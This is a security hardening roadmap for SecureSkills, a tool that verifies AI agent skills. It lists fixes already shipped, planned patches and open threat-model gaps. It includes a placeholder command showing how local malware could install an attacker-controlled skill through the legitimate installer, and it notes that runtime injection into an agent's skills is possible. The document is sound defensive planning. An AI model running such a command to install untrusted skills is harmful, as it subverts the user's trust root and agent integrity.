# TODO

## Hardening Roadmap

### Shipped

- hard-fail on unexpected workspace symlinks during runtime mirroring
- validate mirror destinations before copy, mkdir, or delete operations
- create `.secureskills/keys` with `0700`
- write key files with `0600`
- validate skill names before any path joins
- add regression coverage for the above
- resolve and store git commit SHAs for installed git sources
- surface pinned source revisions in the manifest, lockfile, and `inspect`
- add installer channel and version selection with local install metadata

### Patch Set 3

- add `LICENSE`
- add `SECURITY.md`
- document the v1 threat model and non-goals explicitly

### Patch Set 4

- replace or redesign the current live mirror loop with a safer write-through or evented model
- reduce the shell-hook surface outside explicitly enabled repos

## Installer Authority

SecureSkills v1 treats the local project key as the trust root. That means a malicious script or other RCE already running with enough local privilege could invoke the normal installer flow itself, for example by running:

```bash
npx secureskills add <attacker-controlled-repo> --skill <malicious-skill>
```

If that happens, the malicious skill would be authorized through the legitimate install path and then pass runtime verification.

This needs later-stage mitigation. Candidate directions:

- interactive approval for first-time sources
- allowlists for trusted owners or repositories
- separate installer approval from normal runtime authority
- stronger policy around non-interactive installs

## Codex Runtime Hardening

The planned Codex shell integration will still rely on the current verified-workspace model in phase one. That means pre-launch verification is enforced, but same-user runtime injection into the unlocked skills view is not fully prevented once the agent process is running.

Track this as a second-phase enhancement area:

- make the unlocked runtime view read-only where possible
- detect post-launch mutations
- reduce or eliminate writable plaintext skill materialization
